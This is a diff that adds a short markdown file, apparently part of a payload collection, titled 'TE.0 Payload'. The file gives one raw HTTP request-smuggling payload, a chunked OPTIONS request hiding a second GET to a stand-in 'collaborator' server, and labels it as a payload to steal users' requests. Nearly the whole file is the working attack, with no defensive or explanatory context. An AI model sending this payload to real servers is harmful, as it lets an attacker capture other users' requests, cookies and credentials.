@@ -1,0 +1,19 @@
+# TE.0 Payload
+paylaod to steal user request's:
+```yaml
+OPTIONS / HTTP/1.1
+Host: {HOST}
+Accept-Encoding: gzip, deflate, br
+Accept: */*
+Accept-Language: en-US;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36
+Transfer-Encoding: chunked
+Connection: keep-alive
+
+50
+GET <http://our-collaborator-server/> HTTP/1.1
+x: X
+0
+EMPTY_LINE_HERE
+EMPTY_LINE_HERE
+```
